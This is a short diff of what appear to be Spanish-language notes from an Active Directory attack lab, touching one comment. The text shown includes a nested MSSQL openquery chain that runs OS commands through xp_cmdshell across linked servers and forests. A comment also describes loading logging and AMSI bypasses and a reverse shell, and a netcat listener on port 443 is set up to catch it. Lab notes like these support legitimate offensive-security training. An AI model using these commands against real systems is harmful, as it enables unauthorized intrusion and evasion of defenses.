@@ -255,7 +255,7 @@ Paso 9:
 # Ejecutar un cradle de PowerShell en eu-sql1 via xp_cmdshell para cargar bypass de logging, bypass de AMSI y una reverse shell — obtiene ejecución de código en el servidor del otro bosque (eu.eurocorp.local)
 
 ❯ select * from openquery("dcorp-sql1",'select * from openquery("dcorp-mgmt",''select * from openquery("eu-sql.eu.eurocorp.local",''''select @@version as version;exec master..xp_cmdshell "powershell whoami"'''')'')')
-# Ejecutar comandos OS en eu-sql encadenando openquery anidados manualmente desde dcorp-mssql — recorre toda la cadena dcorp-mssql → dcorp-sql1 → dcorp-mgmt → eu-sql para ejecutar whoami via xp_cmdshell.
+# Ejecutar comandos OS en eu-sql encadenando openquery anidados manualmente desde dcorp-mssql — recorre toda la cadena dcorp-mssql → dcorp-sql1 → dcorp-mgmt → eu-sql para ejecutar whoami via xp_cmdshell
 
 Paso 10:
 ❯ C:\AD\Tools\netcat-win32-1.12\nc64.exe -lvp 443      
